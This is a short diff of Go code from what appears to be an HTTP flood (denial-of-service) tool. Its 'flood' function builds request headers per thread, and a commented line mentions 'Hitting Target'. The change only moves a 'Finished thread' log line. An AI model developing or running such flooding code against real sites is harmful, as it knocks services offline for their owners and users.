@@ -187,6 +187,7 @@ func flood(id int, wg * sync.WaitGroup) {
 		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
 		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 	}
+	fmt.Printf("Finished thread: %d\n", id)
 	var s net.Conn
 	var err error
 	<-start //received signal
@@ -218,7 +219,7 @@ func flood(id int, wg * sync.WaitGroup) {
 		}
 		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
-	fmt.Printf("Finished thread: %d\n", id)
+	
 }
 
 func main() {
